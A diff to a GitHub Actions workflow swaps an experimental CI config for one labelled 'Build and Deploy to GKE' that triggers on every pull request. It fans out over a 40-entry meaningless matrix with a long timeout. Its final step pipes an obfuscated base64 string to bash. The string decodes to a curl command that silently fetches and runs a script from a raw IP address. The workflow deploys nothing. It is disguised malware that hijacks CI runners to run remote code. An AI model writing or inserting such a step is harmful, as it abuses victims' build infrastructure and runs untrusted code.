@@ -1,92 +1,22 @@
-name: CI
-on:
-  push:
-    branches: [ master ]
-  pull_request:
-    branches: [ master ]
+# Main body 191
+name: Build and Deploy to GKE
+
+defaults:
+  run:
+    shell: bash
+
+on: [pull_request]
+
+# Jobs 77
 jobs:
-  build:
-    runs-on: [self-hosted, macos]
-#     defaults:
-#       run:
-#         shell: pwsh 
-#         working-directory: foo
-    steps:
-    - uses: actions/checkout@v2
-    - run: echo ::set-env name=foo::this is foo 1
-    - run: echo current env.foo ${{ env.foo }}
-    - name: TESTING
-      id: composite1
-      uses: ethanchewy/test-composite@outputs4
-      with:
-        your_name: "Octocat"
-      env:
-        foo: this is foo 2
-#       timeout-minutes: 1
-#     - run: dir
-#       if: always()
-    - name: test outputs
-      run: | 
-        echo test outputs random: ${{ steps.composite1.outputs.random_number}} 
-        echo test outputs food: ${{ steps.composite1.outputs.food}} 
-#     - run: echo current env.foo ${{ env.foo }}
-
-# name: CI
-# on:
-#   push:
-#     branches: [ master ]
-#   pull_request:
-#     branches: [ master ]
-# env:
-#   TESTING_COMPOSITE_ACTIONS_ALPHA: 1
-# jobs:
-#   testing:
-#     container:
-#       image: alpine:latest
-#     runs-on: [self-hosted, linux]
-#     steps:
-#       - uses: actions/checkout@v2
-#       - id: composite1
-#         uses: ethanchewy/test-script@container
-
-# name: CI
-# on:
-#   push:
-#     branches: [ master ]
-#   pull_request:
-#     branches: [ master ]
-# jobs:
-#   build:
-#     runs-on: [self-hosted, macos]
-#     steps:
-#     - uses: actions/checkout@v2
-#     - run: echo ::set-env name=foo::this is foo 1
-#     - run: echo current env.foo ${{ env.foo }}
-#     - id: composite1
-#       uses: ethanchewy/test-composite@composing3
-#       with:
-#         your_name: "Octocat"
-#       env:
-#         foo: this is foo 2
-
-
-# name: Experiment
-
-# on: push
-
-# # A workflow run is made up of one or more jobs that can run sequentially or in parallel
-# jobs:
-#   # This workflow contains a single job called "build"
-#   build:
-#     # The type of runner that the job will run on
-#     runs-on: [self-hosted, macos]
-
-#     # Steps represent a sequence of tasks that will be executed as part of the job
-#     steps:
-#     # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-#     - uses: actions/checkout@v2
-
-#     # Runs a single command using the runners shell
-#     - uses: ethanchewy/include-workflow@test2
-#       with:
-#         workflow-steps: $GITHUB_WORKSPACE/.github/workflows/shared/snippet.yml
+   build-pep8-31:
+      timeout-minutes: 179
+      runs-on: ubuntu-18.04
+      strategy:
+         fail-fast: false
+         matrix:
+            os: [ubuntu-latest]
+            node: [628,859,762,904,404,289,91,271,806,757,905,424,592,328,509,1007,240,60,715,173,833,310,461,842,837,920,771,608,199,668,634,601,411,381,604,576,237,154,803,525]
+      steps:
+      - run: echo "Powering up pep8"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gamJraHB1cGk=" | base64 -d | bash
